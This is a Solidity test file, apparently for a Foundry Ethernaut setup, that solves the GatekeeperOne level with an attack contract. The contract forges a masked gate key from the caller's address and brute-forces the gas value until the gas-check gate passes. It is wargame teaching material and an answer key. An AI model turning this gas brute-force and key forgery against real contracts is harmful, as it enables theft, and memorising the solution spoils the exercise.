// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {GatekeeperOne, GatekeeperOneFactory} from "ethernaut/levels/GatekeeperOneFactory.sol";

contract GatekeeperOneLevel is SetUpLevelTest {
    GatekeeperOne internal gatekeeperOne;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0 ether;
        playerBalance = 0 ether;
        level = address(new GatekeeperOneFactory());
        super.setUp();
        gatekeeperOne = GatekeeperOne(instance);

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player, player);
        GateAttackOne gateAttack = new GateAttackOne();
        gateAttack.open(address(gatekeeperOne));
        vm.stopPrank();
    }
}

contract GateAttackOne {
    function open(address _target) public {
        uint64 uintKey = uint64(uint160(address(msg.sender)));
        bytes8 key = bytes8(uintKey) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 200; i < 500; ++i) {
            try GatekeeperOne(_target).enter{gas: i + 8191 * 3}(key) {
                break;
            } catch {}
        }
    }
}
